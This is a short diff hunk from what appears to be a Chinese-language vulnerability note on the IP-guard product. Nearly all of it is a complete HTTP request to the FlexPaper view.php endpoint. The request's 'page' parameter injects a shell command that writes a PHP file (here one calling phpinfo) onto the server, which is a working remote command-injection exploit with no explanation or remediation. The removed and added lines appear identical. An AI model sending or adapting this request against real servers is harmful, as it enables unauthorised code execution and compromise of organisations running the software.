@@ -48,11 +48,11 @@ app="IP-guard"
 漏洞数据包：
 
 ```
-GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=%7C%7Cecho+^%3C?php+phpinfo();+?^%3E+%3Esanyt.php HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
+GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=%7C%7Cecho+^%3C?php+phpinfo();+?^%3E+%3Esanyt.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 
 ```
 
